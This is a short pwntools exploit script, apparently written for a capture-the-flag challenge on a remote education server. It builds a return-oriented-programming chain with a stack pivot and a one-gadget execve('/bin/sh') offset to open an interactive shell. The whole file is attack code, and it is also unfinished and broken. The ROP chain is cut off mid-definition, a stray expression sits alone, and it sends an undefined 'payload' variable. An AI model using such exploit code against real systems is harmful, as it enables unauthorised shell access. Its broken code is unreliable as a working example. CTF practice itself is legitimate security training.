from pwn import *
# p = process('./chal')
p = remote('edu-ctf.zoolab.org', 10005)


context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = 0x7ffff7fcf000


# 0x0000000000001153 : pop rbp ; ret


# execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL
pop_rbp = 0x0000000000001153
execve = 0xe3b01
ROP_address = 0x4e3360
leave_ret = 0x00000000000011a6
ROP_address

ROP = flat(
    pop_rbp, 0x5555555580A0,
    

)

# gdb.attach(p,
# """
# b *main+408
# """
# )

p.sendline(payload)


p.interactive()